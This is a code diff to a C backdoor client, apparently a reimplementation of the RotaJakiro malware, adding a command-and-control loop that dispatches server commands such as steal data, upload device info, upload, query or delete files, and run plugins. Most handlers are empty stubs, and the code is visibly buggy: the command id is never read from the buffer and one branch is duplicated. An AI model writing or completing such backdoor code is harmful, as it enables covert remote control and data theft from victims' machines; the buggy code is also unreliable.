@@ -53,9 +53,8 @@ void c2_loop(){
 	// receive
 
     int n = 0;
-    int len = 0, maxlen = 100;
+    int len = 0, maxlen = 4096;
     char buffer[maxlen];
-	//char* pbuffer = buffer;
 
 	// will remain open until the server terminates the connection
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
@@ -63,16 +62,58 @@ void c2_loop(){
         maxlen -= n;
         len += n;
 
-        //buffer[len] = '\0';
-        printf("received: %s\n", buffer);
+        printf("Data Received: %s\n", buffer);
 
-        // parse out "control bytes" here to identify hex code.
+        unsigned char cmd_id[4];
 
-        if (strncmp("exit", buffer, 4) == 0) {
+        // exit ==> 0x13 0x8E 0x3E 0x06
+        if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
             char *msg = "exiting!";
             send(sock, msg, strlen(msg), 0);
             c2_exit();
         }
+        // perform a "PING"/"PONG" connectivity test
+        else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
+            // TODO parse payload and update second parameter with new time.
+            // having 10 seconds as a place holder for now.
+            c2_set_timeout(&sleepy_time, 10);
+        }
+        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
+            // TODO parse payload and update second parameter with new time.
+            // having 10 seconds as a place holder for now.
+            c2_set_timeout(&sleepy_time, 10);
+        }
+        else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_run_plugin_1, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_run_plugin_2, cmd_id, 4) == 0) {
+
+        }
+        else if (memcmp(&rota_c2_run_plugin_3, cmd_id, 4) == 0) {
+
+        }
+
 
         sleep(sleepy_time);
         memset(buffer, 0, strlen(buffer));
@@ -100,10 +141,9 @@ void c2_heartbeat() {
 }
 
 
-void c2_set_timeout(int sleeptime) {
+void c2_set_timeout(int *sleepTime, int newTime) {
 
-    //TODO: see if a struct get passed in that updates a given sleep function
-
+    *sleepTime = newTime;
 }
 
 
